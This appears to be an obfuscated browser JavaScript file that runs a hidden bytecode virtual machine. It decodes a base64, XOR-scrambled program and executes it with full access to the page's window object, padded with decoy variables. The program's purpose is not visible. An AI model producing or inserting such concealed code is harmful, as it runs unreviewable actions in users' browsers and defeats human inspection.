function a(a, b) {}
var b = ArrayBuffer,
    c = Uint8Array,
    d = Float64Array,
    e = String.fromCharCode,
    f = String.prototype.indexOf.call.bind(String.prototype.indexOf),
    g = String.prototype.charAt.call.bind(String.prototype.charAt),
    h = Array.prototype.join.call.bind(Array.prototype.join),
    i = Array.prototype.slice.call.bind(Array.prototype.slice),
    j = Array.prototype.splice.call.bind(Array.prototype.splice),
    k = Array.prototype.pop.call.bind(Array.prototype.pop),
    l = Array.prototype.push.call.bind(Array.prototype.push),
    m = !1,
    n = !1,
    o = !1,
    p = !1,
    q = !1,
    r = !1,
    s = !1,
    t = !1,
    u = !1,
    w = !1,
    x = !1,
    y = !1,
    z = !1,
    A = !1,
    B = !1,
    C = !1,
    D = !1,
    E = !1,
    F = !1,
    G = !1,
    H = !1,
    I = !1,
    J = !1,
    K = !1,
    L = !1,
    M = !1,
    N = !1,
    O = !1,
    P = !1,
    Q = !1,
    R = !1,
    S = !1,
    T = !1,
    U = !1,
    V = !1,
    W = !1,
    X = !1,
    Y = !1,
    Z = !1,
    $ = !1,
    _ = !1,
    aa = !1,
    ba = !1,
    ca = !1,
    v = !0,
    da = !0,
    ea = !0,
    fa = !0,
    ga = !0,
    ha = !0,
    ia = !0,
    ja = !0,
    ka = !0,
    la = !0,
    ma = !0,
    na = !0,
    oa = !0,
    pa = !0,
    qa = !0,
    ra = !0,
    sa = !0,
    ta = window,
    ua = 'AgoKuru7AwKCj70FYBARYWIGRkqkrR0cXfPyNjc3Z2dTV1cEZEshEm8DZmYmTWEHa0QnZwRsYwdhdB4dHgh3ievg4HrramAeDg6FhIoLjo2AgYOIiAgJbWZkb28JCWhjc3thEhoNAJqLgPXwe3p5C+jmZmdk8/Y2BYWEh+/qYmNljYyH4eQECnkbawh1BZHg6ujtDQ9qfxQDdHAVc2oaEgNlEH4dHtisx9TcfN3ZrNTcfWxsbGxuLi7e19fi5/f38IWGZhJlHR6QkZaGFocGALAhIqmoCAnS2dZ2d6sLBabV0AAFFmcLHnQDdHAVC21pCAl5fW0VlOXj+IgICAgDExsMCoqbkO7qGhZlBgZ2enp1ZWYLHnQDdGhoGBRkBAb2+4UNDoWEigu/tcXNzgsObhaU5eR0BYbv6mJiYwMBKSwQE2MMfGwfaRYWlufldQSH4+cXEpH19vTw4ODm5Ox87emc5Ox+X1WlAQSEhYb18AADIGJgGxk5CHd8bGRiHRYGDgiDiI/PrndHQglpOQiZkhAYHhwXBw8IkJuZKSmDgbNTUlJYaQkLC7OzgYu+Dg0EDAkIv7Q=';
(function() {
    function k(a, b) {
        var c = 0 | b / 40,
            d = b - 40 * c;
        (d < a.d || a.f != c || 40 <= a.d) && (a.d = 0, a.f = c, a.s = 0, a.t = []);
        var e = 0;
        if (!(0 > b)) {
            for (; a.d <= d; a.d++) e = a.p[a.d + 40 * c] ^ a.s, l(a.t, e), a.s ^= 4 > a.d ? a.t[a.d] : j(a.t, 0, 1)[0] ^ a.t[a.t.length - 1];
            return e
        }
    }

    function i(a, b) {
        var c = 0,
            d = 0,
            e = 0;
        do
            if (e = k(a, d + b), c |= (127 & e) << 7 * d++, 5 < d) return {
                o: c,
                c: d
            }; while (128 == (128 & e));
        return {
            o: c,
            c: d
        }
    }

    function da() {
        return 0
    }

    function ea() {
        return []
    }

    function fa(a) {
        var b = 0,
            c = da() << 4;
        if (0 == c) {
            for (; 127 > b++ && !1 & c;) c = a.r[c >> 4];
            return !1 & c || !0 & c ? void 0 : c
        }
    }

    function ga(a) {
        var b = fa(a),
            c = na(a.r[b >> 4]);
        return c >= a.p.length || 0 > c ? -1 : (a.r[b >> 4] = c + 1, ra = c, k(a, c))
    }

    function ha(a) {
        var b = fa(a),
            c = na(a.r[b >> 4]);
        if (c >= a.p.length || 0 > c) return -1;
        var d = i(a, c);
        return a.r[b >> 4] = c + d.c, ra = c, d.o
    }

    function ia(a) {
        return ha(a) >> 4
    }

    function ja(a) {
        var f = ha(a);
        if (!(0 > f)) {
            for (var g = 0; 127 > g++ && !1 & f;) f = a.r[f >> 4];
            if (!(!1 & f)) {
                if (2 === f) {
                    var i = new b(8),
                        j = new c(i);
                    j[7] = ga(a), j[6] = ga(a), j[5] = ga(a), j[4] = ga(a), j[3] = ga(a), j[2] = ga(a), j[1] = ga(a), j[0] = ga(a);
                    var k = new d(i);
                    return k[0]
                }
                if (3 === f) {
                    var m = ea();
                    if (0 != m.length) return;
                    for (var n = 0; 0 != (n = ga(a));) l(m, e(n));
                    return h(m, '')
                }
                if (4 === f) return !0;
                if (5 === f) return !1;
                if (6 === f) return null;
                if (7 !== f) {
                    if (8 === f) {
                        var o = ga(a);
                        return 127 < o ? o -= 256 : o
                    }
                    if (9 === f) {
                        var p = ga(a) << 8 | ga(a);
                        return 32767 < p ? p -= 65536 : p
                    }
                    if (10 === f) {
                        var q = ga(a) << 16 | ga(a) << 8 | ga(a);
                        return 8388607 < q ? q -= 16777216 : q
                    }
                    if (11 === f) {
                        var r = ga(a) << 24 | ga(a) << 16 | ga(a) << 8 | ga(a);
                        return 2147483647 < r ? r -= 4294967296 : r
                    }
                    return a.r[f >> 4]
                }
            }
        }
    }

    function ka(a) {
        var b = ha(a);
        return sa = ra, 0 > b ? null : b >= va.length ? void 0 : va[b]
    }

    function la(a, b) {
        a.r[ia(a)] = b
    }

    function ma(a) {
        var b = null;
        try {
            for (; null != (b = ka(a));) b(a)
        } catch (a) {}
    }
    var na = Math.round,
        oa = []; {
        var wa = (ua + '').replace(/[=]+$/, ''),
            xa = 0;
        for (var ya, za, Aa = 0, Ba = 0; za = g(wa, Ba++); ~za && (ya = Aa % 4 ? 64 * ya + za : za, Aa++ % 4) ? (xa = 255 & ya >> (6 & -2 * Aa), l(oa, xa), xa) : 0) za = f('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=', za)
    }
    var pa = function b(c, d, e, f) {
        a(this, b), this.g = c, this.p = d, this.r = e || [], null == e && (this.r[2] = void 0, this.r[1] = [{
            h: 0,
            t: c,
            f: null
        }], this.r[0] = 0), this.v = f || {}, this.s = 0, this.d = 0, this.f = 0, this.t = []
    };
    var qa = {
        g: this
    };
    qa.g.ct = pa;
    var v = new pa(ta, oa, null, qa);
    qa.g.d = k, qa.g.rvi = i;
    var ra = 0;
    qa.g.sz = da, qa.g.sa = ea, qa.g.nr = fa, qa.g.db = ga, qa.g.dg = ha, qa.g.dr = ia, qa.g.da = ja;
    var sa = 0;
    qa.g.di = ka, qa.g.qa = la;
    var va = [];
    l(va, function(a) {
        la(a, ja(a) + ja(a))
    }), l(va, function(a) {
        la(a, ja(a) - ja(a))
    }), ca, ba, aa, _, $, Z, Y, X, W, V, U, T, S, l(va, function(a) {
        la(a, ja(a))
    }), R, l(va, function(a) {
        la(a, a.g)
    }), l(va, function(a) {
        la(a, ja(a)[ja(a)])
    }), l(va, function(a) {
        ja(a)[ja(a)] = ja(a)
    }), Q, P, O, N, l(va, function(a) {
        var b = ja(a);
        la(a, ja(a).apply(b, []))
    }), l(va, function(a) {
        var b = ja(a);
        la(a, ja(a).apply(b, [ja(a)]))
    }), M, L, K, J, I, H, G, F, E, l(va, function(a) {
        la(a, {})
    }), l(va, function(a) {
        la(a, [])
    }), D, l(va, function(a) {
        la(a, void 0)
    }), C, B, A, z, y, l(va, function(a) {
        la(a, ja(a) === ja(a))
    }), x, w, l(va, function(a) {
        la(a, ja(a) < ja(a))
    }), u, t, s, r, l(va, function(b) {
        var c = ja(b);
        0 == c || c == void 0 ? b.r[0] = ja(b) : ja(b)
    }), l(va, function(b) {
        var c = ja(b);
        0 != c && c != void 0 ? b.r[0] = ja(b) : ja(b)
    }), q, p, l(va, function(a) {
        la(a, a)
    }), o, n, m, l(va, function(a) {
        var d = ja(a),
            c = [];
        for (var b = 0; b < d; b++) l(c, ja(a));
        la(a, c)
    }), qa.g.is = va, qa.g.rc = ma, ma(v)
}).call({});
